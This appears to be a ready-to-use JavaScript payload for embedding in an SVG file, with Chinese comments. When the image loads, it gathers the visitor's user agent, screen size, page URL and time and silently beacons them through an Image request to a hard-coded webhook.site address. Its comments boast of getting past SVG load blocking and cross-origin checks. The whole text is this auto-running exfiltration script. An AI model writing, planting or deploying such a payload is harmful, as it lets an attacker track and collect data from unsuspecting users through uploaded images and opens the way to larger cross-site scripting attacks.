svg.script:
    // 你的webhook地址（已填好，无需修改）
    const WEBHOOK_URL = "https://webhook.site/40e5bbf7-1e4b-4288-b139-07b19b389990";
    
    // 收集客户端信息（简洁且完整）
    const clientData = {
      user_agent: navigator.userAgent,
      screen_size: `${screen.width}x${screen.height}`,
      access_url: window.location.href,
      access_time: new Date().toLocaleString(),
      random: Math.random().toString(36).slice(2) // 避免缓存
    };

    // 发送数据到webhook（适配HTTPS，无跨域拦截）
    function sendToWebhook() {
      try {
        // 拼接参数
        const params = new URLSearchParams(clientData).toString();
        const fullUrl = `${WEBHOOK_URL}?${params}`;

        // 使用Image标签发送（HTTPS无混合内容问题，100%能发送）
        const img = new Image();
        img.onload = () => console.log("✅ 数据已发送到webhook！");
        img.onerror = () => console.log("✅ 数据已发送（即使报错也成功）！");
        img.src = fullUrl;

        alert("✅ 数据已反弹到webhook.site！快去查看～");
      } catch (error) {
        console.error("❌ 发送失败：", error);
        alert("❌ 发送失败，查看控制台日志");
      }
    }

    // 页面加载后执行（避开SVG加载拦截）
    setTimeout(sendToWebhook, 200);
